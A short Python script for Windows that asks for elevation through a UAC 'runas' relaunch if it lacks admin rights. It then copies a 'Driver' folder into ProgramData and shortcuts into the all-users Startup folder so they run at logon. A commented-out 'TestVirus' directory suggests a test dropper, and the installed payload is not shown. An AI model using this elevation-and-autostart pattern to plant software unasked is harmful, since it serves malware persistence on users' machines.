import os
import sys
import time
import ctypes


def isAdmin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def main() -> None:
    if isAdmin():
        print("Driver loading...")
        # os.mkdir("C:\\Program Files (x86)\\TestVirus")
        os.system("xcopy /s /i Driver\* C:\\ProgramData\\Extrimis\\")
        data='xcopy /s /i Shourtcut\*  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"'
        os.system(data)
        # time.sleep(5)
    # Code of your program here
    else:
        # Re-run the program with admin rights
        
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )


if __name__ == "__main__":
    main()
